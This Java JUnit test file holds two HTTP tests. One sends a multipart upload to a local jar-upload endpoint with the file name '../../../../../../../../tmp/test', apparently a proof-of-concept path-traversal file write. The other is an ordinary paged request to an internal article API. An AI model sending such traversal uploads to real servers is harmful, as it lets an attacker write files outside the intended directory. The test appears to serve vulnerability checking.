import com.alibaba.fastjson.JSONObject;
import com.asen.buffalo.http.OkHttpClients;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.junit.Test;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;


public class TestCase {


    @Test
    public void test() throws IOException {
        String s = "test12341234";
        MultipartBody formBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("jarfile",
                        "../../../../../../../../tmp/test",
                        RequestBody.create(s.getBytes(), MediaType.parse("application/octet-stream")))
                .build();
        Response response = OkHttpClients.create()
                .url("http://127.0.0.1:8081/jars/upload")
                .addHeader("User-Agent", " Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
                .multipartBody(formBody)
                .post()
                .response();
        System.out.println(response);
    }

    @Test
    public void test2() throws IOException {
        Map<String, Object> body = new HashMap<>();
        body.put("pageNum", 1);
        body.put("pageSize", 10);
        JSONObject result = OkHttpClients.create()
                .url("http://10.69.180.45:8080/open/at/article/listAll")
                .requestBody(body)
                .post()
                .toJSONObject();
        System.out.println(result);
    }
}
